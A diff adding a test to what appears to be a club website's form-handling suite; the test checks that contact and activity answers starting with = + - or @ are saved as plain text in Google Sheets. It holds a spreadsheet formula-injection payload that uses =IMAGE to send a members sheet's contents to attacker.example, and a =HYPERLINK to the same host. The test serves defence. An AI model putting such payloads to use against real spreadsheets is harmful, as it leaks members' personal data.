@@ -570,6 +570,22 @@ test('contact form: kept in the private Sheet and emailed on; spam and messages 
   assert.ok(!d.includes('asha.v@example.com') && !d.includes('Asha Verma'), 'contact messages never reach the website');
 });
 
+test('form answers that start with = + - or @ are kept as text, never turned into formulas (contact form into the private Sheet, activities into the main one)', () => {
+  const grab = '=IMAGE("https://attacker.example/?d="&TEXTJOIN(",",TRUE,members_master!A:Z))';
+  env.submit('contact', { [Q.kName]: '=1+1', [Q.kReply]: '+91 98765 11111', [Q.kTopic]: 'I want to volunteer', [Q.kCity]: '@Agra', [Q.kMessage]: grab });
+  const msg = env.priv.rows('contact_messages').at(-1);
+  assert.deepEqual([msg.name, msg.reply_to, msg.city, msg.message], ['=1+1', '+91 98765 11111', '@Agra', grab]);
+  assert.equal(env.priv.getSheetByName('contact_messages').formulas.size, 0, 'no formula in the private Sheet');
+  env.submit('activity', {
+    [Q.club]: 'RC Agra North', [Q.name]: '-Rtn Test', [Q.role]: 'Secretary', [Q.mobile]: '98765 43210', [Q.kind]: Q.kindActivity,
+    [Q.aTitle]: '=HYPERLINK("https://attacker.example","Open")', [Q.aDate]: '2026-10-11', [Q.aTheme]: 'Club service / Other',
+    [Q.aDesc]: '=A1', 'Photos (up to 3, each under 1 MB)': ['1AbCdEfGhIjKlMnOpQrStUvWxYz0123456'], [Q.aConsent]: ['yes'],
+  });
+  const act = env.main.rows('activities').at(-1);
+  assert.deepEqual([act.title, act.description, act.submitter_name], ['=HYPERLINK("https://attacker.example","Open")', '=A1', '-Rtn Test']);
+  assert.equal(env.main.getSheetByName('activities').formulas.size, 0, 'no formula in the main Sheet');
+});
+
 test('monthly email: the quiet clubs (no activity in the last 30 days), the same as the dashboard, to the dummy receiver; private', () => {
   const before = env.mails.length;
   const n = env.run('notPostingReport');
